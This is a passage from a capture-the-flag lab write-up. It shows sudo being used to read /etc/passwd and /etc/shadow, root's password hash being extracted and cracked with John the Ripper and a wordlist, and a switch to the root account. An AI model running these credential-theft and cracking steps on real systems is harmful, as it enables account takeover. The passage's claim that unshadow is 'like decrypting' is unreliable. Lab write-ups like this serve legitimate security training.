```bash
john@bruteit:~$ sudo /bin/cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

Remember that there is a file called `/etc/passwd` & `etc/shadow`. `/etc/passwd` can be read by everyone but the goldmine here is the `/etc/shadow`. It can only be read by `root`.

```bash
john@bruteit:~$ sudo /bin/cat /etc/passwd && sudo /bin/cat /etc/shadow
root:x:0:0:root:/root:/bin/bash

root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::

```

Now that we have the `hash` of root user. We can do something called `Unshadow`. It's like decrypting the password.

```bash
┌──(haz0x㉿kali)-[/tmp]
└─$ nano passwd               

┌──(haz0x㉿kali)-[/tmp]
└─$ nano shadow   

┌──(haz0x㉿kali)-[/tmp]
└─$ unshadow passwd shadow > roothash

┌──(haz0x㉿kali)-[/tmp]
└─$ john --wordlist="$ROCKYOU" roothash       
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)     
1g 0:00:00:00 DONE (2026-01-09 10:20) 10.00g/s 7680p/s 7680c/s 7680C/s 123456..kayla
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

```bash
john@bruteit:~$ su root
Password: 
root@bruteit:/home/john# 
```

